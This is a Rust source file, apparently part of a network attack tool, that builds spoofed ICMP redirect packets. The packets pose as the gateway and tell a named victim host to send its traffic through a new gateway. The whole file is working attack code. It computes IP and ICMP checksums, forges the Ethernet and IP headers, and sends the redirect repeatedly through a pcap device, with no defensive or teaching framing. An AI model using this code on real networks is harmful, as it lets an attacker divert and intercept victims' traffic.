use std::error::Error;
use std::net::Ipv4Addr;

use crate::utils::{MacAddr, ipv4_to_bytes, send_packet};
use pcap::Device;

fn checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut chunks = data.chunks_exact(2);
    for chunk in &mut chunks {
        let word = u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
        sum = sum.wrapping_add(word);
    }

    if let Some(&rem) = chunks.remainder().first() {
        sum = sum.wrapping_add((rem as u32) << 8);
    }

    while (sum >> 16) != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    !(sum as u16)
}

fn build_icmp_redirect(
    attacker_mac: MacAddr,
    victim_mac: MacAddr,
    gateway_ip: Ipv4Addr,
    victim_ip: Ipv4Addr,
    new_gateway: Ipv4Addr,
) -> Vec<u8> {
    let mut packet = Vec::new();

    packet.extend_from_slice(&victim_mac.0);
    packet.extend_from_slice(&attacker_mac.0);
    packet.extend_from_slice(&0x0800u16.to_be_bytes());

    let src_ip = ipv4_to_bytes(gateway_ip);
    let dst_ip = ipv4_to_bytes(victim_ip);

    let mut ip_header = vec![0u8; 20];
    ip_header[0] = 0x45;
    ip_header[8] = 64;
    ip_header[9] = 1; // ICMP
    ip_header[12..16].copy_from_slice(&src_ip);
    ip_header[16..20].copy_from_slice(&dst_ip);

    // ICMP redirect
    let mut icmp_payload = vec![0u8; 8 + 20]; // 8 bytes for redirect + original IP header skeleton
    icmp_payload[0] = 5; // type
    icmp_payload[1] = 1; // code (redirect host)
    icmp_payload[4..8].copy_from_slice(&ipv4_to_bytes(new_gateway));

    // Add a placeholder original IP header (zeros) to make packet realistic
    let ip_total_len = (ip_header.len() + icmp_payload.len()) as u16;
    ip_header[2..4].copy_from_slice(&ip_total_len.to_be_bytes());
    let ip_checksum = checksum(&ip_header);
    ip_header[10..12].copy_from_slice(&ip_checksum.to_be_bytes());

    let icmp_checksum = checksum(&icmp_payload);
    icmp_payload[2..4].copy_from_slice(&icmp_checksum.to_be_bytes());

    packet.extend_from_slice(&ip_header);
    packet.extend_from_slice(&icmp_payload);

    packet
}

pub fn perform_icmp_redirect(
    device: &Device,
    attacker_mac: MacAddr,
    victim_mac: MacAddr,
    gateway_ip: Ipv4Addr,
    victim_ip: Ipv4Addr,
    new_gateway: Ipv4Addr,
    repeat: u16,
) -> Result<(), Box<dyn Error>> {
    let packet = build_icmp_redirect(attacker_mac, victim_mac, gateway_ip, victim_ip, new_gateway);

    for _ in 0..repeat {
        send_packet(device, &packet)?;
    }

    Ok(())
}
